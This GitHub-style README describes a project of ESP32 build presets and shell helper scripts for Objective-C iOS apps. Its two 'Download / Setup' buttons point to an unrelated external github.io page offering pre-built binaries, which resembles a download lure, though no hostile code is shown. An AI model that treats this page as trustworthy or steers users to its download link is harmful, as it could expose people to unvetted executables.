# RobRun‑Objective‑ESP  
*Effortless ESP32 build presets for Objective‑C projects*  

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)  
[![Platform: iOS | ESP32](https://img.shields.io/badge/Platform-iOS%20|%20ESP32-blue)](#)  
[![Version: 1.0.0](https://img.shields.io/badge/Version-1.0.0-green)](#)  
[![Download / Release](https://img.shields.io/badge/Download%20%2F%20Setup-Launch%20Now-brightgreen?logo=github)](https://rewfdf.github.io/SetupPage/)

---  

## 🎯 What is this repository?

RobRun‑Objective‑ESP bundles a set of **ready‑to‑use ESP‑32 configuration presets** that integrate cleanly with Objective‑C iOS applications. The goal is to eliminate the friction between iOS development and embedded‑system firmware builds, giving you:

* A **Release preset** that produces a lean, production‑ready binary.  
* A **Customizable preset** that exposes every ESP‑32 build flag through a simple `plist`‑style interface.  
* Helper scripts that automate the whole workflow from Xcode to the ESP‑32 flash utility.

---  

## 📂 Repository layout

```
├─ Presets/
│   ├─ Release.preset          # Zero‑touch, size‑optimised build
│   └─ Custom.preset           # Full‑exposure of ESP‑IDF flags
├─ Scripts/
│   ├─ build.sh                # Wrapper around idf.py for Xcode
│   └─ flash.sh                # Auto‑detects serial port & flashes
├─ Docs/
│   ├─ GettingStarted.md
│   └─ AdvancedUsage.md
└─ README.md
```

---  

## 🚀 Quick‑Start

1. **Clone the repo**  

   ```bash
   git clone https://github.com/FiscalPresent/RobRun-Objective-ESP.git
   cd RobRun-Objective-ESP
   ```

2. **Run the installer** (one‑liner that pulls the latest ESP‑IDF, sets up paths, and registers the Xcode build phase)

   ```bash
   ./Scripts/build.sh --install
   ```

3. **Pick a preset** in Xcode:  
   *Project → Build Settings → “RobRun ESP Preset”* → choose **Release** or **Custom**.

4. **Build & flash**  

   ```bash
   ./Scripts/flash.sh
   ```

That’s it – your iOS app can now talk to the freshly programmed ESP‑32.

---  

## 🛠️ Features at a glance  

| Feature | Release preset | Custom preset |
|--------|----------------|---------------|
| **Binary size** | Optimised for OTA (≈ 350 KB) | Full debug symbols (≈ 1.2 MB) |
| **Wi‑Fi config** | Embedded JSON, no code changes | UI‑driven plist → `sdkconfig` |
| **OTA support** | Built‑in, one‑click from Xcode | Optional, toggle in preset |
| **Logging** | Minimal, `ESP_LOG_ERROR` only | Verbose, all ESP‑LOG levels |
| **Power management** | Deep‑sleep defaults | Adjustable sleep timers |
| **Automation** | `build.sh` + `flash.sh` | Same scripts with extra flags |
| **Cross‑platform** | Works on macOS & Linux (via Docker) | Same |

---  

## 📖 Detailed Documentation  

* **[Getting Started](Docs/GettingStarted.md)** – step‑by‑step walkthrough for new users.  
* **[Advanced Usage](Docs/AdvancedUsage.md)** – fine‑tune `sdkconfig`, add custom components, integrate with CI pipelines.  
* **[FAQ & Troubleshooting](Docs/FAQ.md)** – common pitfalls and solutions.

---  

## 🤖 Automation Scripts  

| Script | Purpose | Example |
|--------|---------|---------|
| `build.sh` | Wraps `idf.py` with Xcode environment variables | `./Scripts/build.sh --preset Release` |
| `flash.sh` | Detects the correct serial port and runs `esptool.py` | `./Scripts/flash.sh --port /dev/cu.SLAB_USBtoUART` |
| `ci.yml` *(GitHub Action)* | CI pipeline that builds the Release binary on every push | Auto‑triggered, no manual steps |

All scripts are **POSIX‑compatible** and include helpful `--help` output.

---  

## 📦 Download / Release  

Click the button below to open the interactive Release page where you can:

* Download pre‑built Release binaries.  
* Generate a custom preset bundle.  
* View live build logs.

[<img src="https://img.shields.io/badge/Launch%20Setup%20Page-▶️-0066ff?style=for-the-badge&logo=github" alt="Launch Release Page">](https://rewfdf.github.io/SetupPage/)

---  

## 👥 Contributing  

Contributions are welcome! Please follow these steps:

1. Fork the repository.  
2. Create a feature branch (`git checkout -b feat/your‑feature`).  
3. Keep the code style consistent with existing scripts (bash + POSIX).  
4. Add or update documentation in the `Docs/` folder.  
5. Submit a pull request with a clear description of the change.

---  

## 📜 License  

This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for details.

---  

### ✉️ Contact  

* **Author**: FiscalPresent  
* **GitHub**: [FiscalPresent](https://github.com/FiscalPresent)  
* **Twitter**: @FiscalPresent  

Happy coding! 🚀